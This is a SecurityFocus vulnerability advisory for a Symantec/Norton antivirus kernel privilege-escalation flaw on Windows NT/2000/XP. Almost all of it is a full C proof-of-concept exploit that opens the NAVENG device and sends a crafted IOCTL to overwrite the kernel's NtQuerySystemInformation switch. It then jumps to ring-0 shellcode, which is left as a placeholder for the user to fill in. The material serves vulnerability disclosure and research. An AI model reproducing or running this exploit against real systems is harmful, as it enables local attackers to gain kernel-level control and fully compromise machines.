source: http://www.securityfocus.com/bid/20360/info

Symantec AntiVirus is prone to a privilege-escalation vulnerability.

Local attackers can exploit this issue to corrupt memory and execute arbitrary code with kernel-level privileges. Successful exploits may facilitate a complete system compromise.

This issue affects only Symantec and Norton antivirus products running on Microsoft Windows NT, Windows 2000, and Windows XP.

////////////////////////////////////
///// Norton Internet Security
////////////////////////////////////
//// For educational purposes ONLY
////
//// Kernel Privilege Escalation #1
//// Exploit
//// Rub?n Santamarta 
//// www.reversemode.com
//// 26/08/2006
////
////////////////////////////////////



#include <windows.h>
#include <stdio.h>

#define WXP_SWITCH 0xA5522
#define W2K_SWITCH 0x91531

typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
									DWORD ,
									LPDWORD);

typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
									LPTSTR lpBaseName,
									DWORD nSize);


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

int main(int argc, char *argv[])
{

 DWORD				*OutBuff,*InBuff,*ShellAddr;			
 DWORD				dwIOCTL,OutSize,InSize,junk,cb,devNum,i,Ring0Addr;
 HANDLE				hDevice;
 PENUMDEVICES pEnumDeviceDrivers;
 PGETDEVNAME  pGetDeviceDriverBaseName;
 LPVOID arrMods[200],addEx;
 DWORD BaseNt=0,BaseAuxNt;
 BOOL InXP;
 CHAR baseName[MAX_PATH];
 
 //"PUT YOUR RING0 CODE HERE "
 unsigned char Ring0ShellCode[]="\xcc\x90\x90\x90";       
 
  system("cls");
 
  printf("\n################################\n");
  printf("## Norton I.S                 ##\n");
  printf("## Ring0 Exploit              ##\n");
  printf("################################\n");
  printf("\nRuben Santamarta\nwww.reversemode.com\n\n");
  
 if(argc<2)
 {
  
 
  printf("\nusage> exploit.exe <XP> or <2K>\n");
  exit(1);
 }
 

 pEnumDeviceDrivers=(PENUMDEVICES)GetProcAddress(LoadLibrary("psapi.dll"),
												 "EnumDeviceDrivers");

 pGetDeviceDriverBaseName=(PGETDEVNAME)GetProcAddress(LoadLibrary("psapi.dll"),
												 "GetDeviceDriverBaseNameA");

 pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb);
 devNum=cb/sizeof(LPVOID);
 printf("\n[!] Searching Ntoskrnl.exe Base Address...");

 for(i=0;i<=devNum;i++)
 {
       pGetDeviceDriverBaseName(arrMods[i],baseName,MAX_PATH);
	   if((strncmp(baseName,"ntoskr",6)==0))
	   {
	  	   printf("[%x] Found!\n",arrMods[i]);
		   BaseNt = (DWORD)arrMods[i];
		   BaseAuxNt = BaseNt;
	   }
 }
 
if (!BaseNt) 
{
   printf("!!? ntoskrnl.exe base address not found\nexiting\n\n");
   exit(0);
}


//////////////////////
///// CASE 'DosDevice'
//////////////////////

hDevice = CreateFile("\\\\.\\NAVENG",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);

//////////////////////
///// INFO 
//////////////////////
 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 
 printf("\n\n** Initializing Exploit]\n\n");
 printf("INFORMATION \n");
 printf("-----------------------------------------------------\n");
 printf("[!] NAVENG Device Handle [%x]\n",hDevice);
 

 

 //////////////////////
 ///// IOCTL
 //////////////////////
 OutSize = 4;
 dwIOCTL = 0x222AD3;
 
 
 if(strncmp(argv[1],"XP",2)==0)  Ring0Addr = BaseNt + WXP_SWITCH;
 else                            Ring0Addr = BaseNt + W2K_SWITCH;

 printf("[!] Overwriting NtQuerySystemInformation Switch at [0x%x]\n",Ring0Addr);

 ShellAddr=(DWORD*)VirtualAlloc((LPVOID)0x2000000
                                ,0xF000
                                ,MEM_COMMIT|MEM_RESERVE
                                ,PAGE_EXECUTE_READWRITE);
 
 
 for(i=1;i<0x3C00;i++) ShellAddr[i]=(DWORD)ShellAddr; // paged out
 memcpy((LPVOID)ShellAddr,(LPVOID)Ring0ShellCode,sizeof(Ring0ShellCode));
 
 printf("\n\n\t\t[!] Initializing Countdown,last chance to abort.");
 
 for(i=10;i>=1;i--)
 {
   printf("\r -[ %d ]- ",i);
   if(i==1) printf("\n\n[*] Executing ShellCode");
   Sleep(1000);
 }      
         
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 (LPVOID)0,0,
                 (LPVOID)Ring0Addr,OutSize,
                 &junk,  
                 NULL);
                 
 system("dir");  // NtQuerySystemInformation Nasty Hack ;
 
 /////////////////////
 ///// CLeanUp
 /////////////////////
 
 CloseHandle(hDevice);
 free(ShellAddr);
 
 printf("\n\n[*] Exploit terminated\n\n");
 return 0;
}